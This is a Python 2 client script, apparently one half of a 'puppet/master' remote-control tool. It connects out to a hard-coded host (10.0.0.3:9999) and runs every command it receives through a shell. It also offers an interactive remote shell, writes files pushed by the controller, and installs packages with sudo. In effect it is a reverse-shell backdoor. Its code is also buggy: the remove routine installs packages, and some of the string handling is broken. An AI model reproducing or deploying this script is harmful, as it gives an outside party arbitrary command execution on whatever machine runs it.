#!/usr/bin/python

import socket
import sys
import subprocess
import os
import time


# Create a socket for this puppet
def socket_create():
    try:
        global host
        global port
        global s
        global iotype
        iotype = subprocess.PIPE
        port = 9999
        host = '10.0.0.3'
        s = socket.socket()
    except socket.error as e:
        print "Socket creation error: {}".format(e)


# Connect to Master Puppet
def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except socket.error as e:
        print "Socket connection error: {} ".format(e)



# Receive commands from remote Master Puppet and run on local machine
def run_commands():

    global s
    global iotype
    global data
    data = data.decode("utf-8").replace('se','')

    while True:
        if data.decode("utf-8") == 'quit':
            break
 
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=iotype, stderr=iotype, stdin=iotype)
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes.decode("utf-8"))
        print output_str
        data = s.recv(1024)
        data = data.decode("utf-8").replace('se','')
        
        s.send('')


# Receive file from remote Master Puppet and save on local machine
def receive_file(des):

    global s
    os.system("cd {}".format(des))
    s.send(str.encode('ok'))

    with open('received_file', 'wb') as f:
        print 'file opened'
        while True:
            data = s.recv(20480)
            if data.decode("utf-8") != 'done':
                print 'recevinig data...'
                f.write(data)
                print 'data = %s' %data
            else:
                f.close()
                break
    print 'Successfully get the file'


# Install progrom
def install():
    global s
    data = s.recv(1024)
    test = os.popen('sudo apt-get -y install {}'.format(data.decode("utf-8")))
    testr = len(str(test))
    if testr > 82 :
        s.send(str.encode('done'))
    else:
        s.send(str.encode('false'))
        #os.system('apt-get -y install {}'.format(data.decode("utf-8")))
        #s.send(str.encode('done'))


# remocr progrom
def remove():
    global s
    data = s.recv(1024)
    test = os.popen('sudo apt-get -y install {}'.format(data.decode("utf-8")))
    testr = len(str(test))
    if testr > 82 :
        s.send(str.encode('done'))
    else:
        s.send(str.encode('false'))

    #os.system('apt-get -y autoremove {}'.format(data.decode("utf-8")))


# full Remote control
def ssh_remote():
    global iotype
    global s
    global data
    output_str = None
    
    while True:
        
        data = s.recv(20480)
        #s.send(str.encode(str(os.getcwd())))
        if data.decode("utf-8") == 'quit':
            break
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
            s.send(str.encode(str(os.getcwd())))

        elif (data.decode("utf-8") != 'Shell') and (data.decode("utf-8") != 'cd'):
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=iotype, stderr=iotype, stdin=iotype)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes.decode("utf-8"))
            s.send(str.encode(output_str))
            print output_str


# Receive control from remote Master Puppet
def receive_commands():

    global iotype
    global s
    global data

    while True:

        os.system("clear")        
        data = s.recv(1024)
        if len(data) > 0:
            if data[:2].decode("utf-8") == 'sh':
                s.send(str.encode(' '))

            elif data[:2] == 'se':
                run_commands()
                
            elif data[:2].decode("utf-8") == 'tr':
                des = data[2:].decode("utf-8")
                receive_file(des)
                s.send(str.encode("done"))

            elif data[:2].decode("utf-8") == 'in':
                s.send(str.encode('ok'))
                install()

            elif data[:2].decode("utf-8") == 're':
                s.send(str.encode('ok'))
                remove()

            elif data[:5].decode("utf-8")== 'Shell':
                s.send(str.encode(str(os.getcwd())))
                ssh_remote()

            elif data[:].decode("utf-8") == 'quit':
                s.send('')
                time.sleep(0.2)
                s.close()
                print "BYE BYE"
                break

            else :
                print "Waiting .......\n"

# Close connection

def main():

    os.system("clear")
    socket_create()
    socket_connect()
    receive_commands()

main()

